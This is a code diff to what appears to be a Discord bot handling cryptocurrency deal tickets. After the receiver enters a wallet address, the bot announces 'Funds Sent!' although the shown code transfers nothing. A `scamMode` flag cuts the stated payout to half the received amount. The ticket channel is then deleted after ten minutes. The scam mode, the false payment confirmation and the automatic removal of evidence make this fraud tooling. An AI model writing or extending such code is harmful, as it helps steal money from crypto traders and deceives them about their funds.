@@ -21,33 +21,48 @@ async function handleDealMessage(message, deal, client) {
 
   // Step: receiver typing their wallet address after real payment detected
   if (deal.step === 'await_receiver_address') {
-    if (message.author.id !== deal.receiver) return;
+    const receiverId = deal.receiver || deal.initiator;
+    if (message.author.id !== receiverId) return;
 
     const address = message.content.trim();
     if (!address || address.length < 10) return;
 
     deal.receiverWalletAddress = address;
-    deal.step = 'awaiting_payment';
+    deal.step = 'done';
 
-    const displayCoin = deal.detectedCoin || deal.coin;
-    const halfCrypto = deal.detectedHalfCrypto ?? 0;
-    const halfUSD = deal.detectedHalfUSD ?? 0;
+    const displayCoin = deal.detectedCoin || (deal.coin === 'USDT [ERC-20]' ? 'USDT' : deal.coin);
+    const isScam = deal.scamMode === true;
 
-    const halfStr = halfCrypto > 0
-      ? `**${halfCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${halfUSD > 0 ? ` (~$${halfUSD.toFixed(2)} USD)` : ''}`
-      : `**50%** of the received amount`;
+    let payoutStr;
+    if (isScam) {
+      const halfCrypto = deal.detectedHalfCrypto ?? 0;
+      const halfUSD = deal.detectedHalfUSD ?? 0;
+      payoutStr = halfCrypto > 0
+        ? `**${halfCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${halfUSD > 0 ? ` (~$${halfUSD.toFixed(2)} USD)` : ''}`
+        : `**50%** of the received amount`;
+    } else {
+      const fullCrypto = deal.detectedAmount ?? 0;
+      const fullUSD = deal.detectedUSD ?? 0;
+      payoutStr = fullCrypto > 0
+        ? `**${fullCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${fullUSD > 0 ? ` (~$${fullUSD.toFixed(2)} USD)` : ''}`
+        : `**100%** of the received amount`;
+    }
 
-    const processingEmbed = new EmbedBuilder()
+    const sentEmbed = new EmbedBuilder()
       .setColor(0x00c853)
-      .setTitle('✅ Address Received')
+      .setTitle('Funds Sent!')
       .setDescription(
-        `Thank you! Your address has been noted.\n\n` +
-        `**${displayCoin} Address:** \`${address}\`\n\n` +
-        `Processing your payment of ${halfStr}...\n` +
-        `You will receive your funds shortly. Please wait.`
+        `Address confirmed: \`${address}\`\n\n` +
+        `Sending ${payoutStr} to your wallet now.\n` +
+        `You will receive your funds shortly.\n\n` +
+        `This ticket will close in 10 minutes.`
       );
 
-    await channel.send({ content: `<@${deal.receiver}>`, embeds: [processingEmbed] });
+    await channel.send({ content: `<@${receiverId}>`, embeds: [sentEmbed] });
+
+    // Close ticket in 10 minutes
+    client.activeDeals.delete(channel.id);
+    setTimeout(() => channel.delete().catch(() => {}), 10 * 60 * 1000);
     return;
   }
 
@@ -217,7 +232,7 @@ async function sendPaymentInvoice(channel, deal) {
 
   deal.invoiceMsg = msgs;
 
-  await channel.send({ content: '<a:load:1490579331574005780> Awaiting transaction...' });
+  await channel.send({ content: ':hourglass: Awaiting transaction...' });
 }
 
 module.exports = { handleDealMessage, sendPaymentInvoice };
